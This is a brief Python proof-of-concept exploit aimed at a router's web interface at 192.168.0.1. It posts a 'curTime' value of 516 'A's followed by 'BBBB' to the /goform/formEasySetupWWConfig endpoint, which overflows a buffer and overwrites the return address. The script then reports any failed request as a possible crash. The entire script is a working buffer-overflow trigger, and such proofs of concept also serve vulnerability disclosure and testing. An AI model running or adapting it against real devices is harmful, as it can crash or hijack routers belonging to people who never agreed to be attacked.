import requests

# Target Configuration
TARGET_IP = "192.168.0.1"
URL = f"http://{TARGET_IP}/goform/formEasySetupWWConfig"

# Offset: 516 bytes to reach the return address
# Construct 516 'A's to fill the buffer; the subsequent 4 bytes overwrite the RA/PC
payload = "A" * 516 + "BBBB" 

# Construct POST Data
data = {
    "curTime": payload,
    "config.wan_type": "0",
    "config.wireless.SSID": "test_network"
}

try:
    response = requests.post(URL, data=data, timeout=5)
    print(f"Response Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request failed (Possible crash): {e}")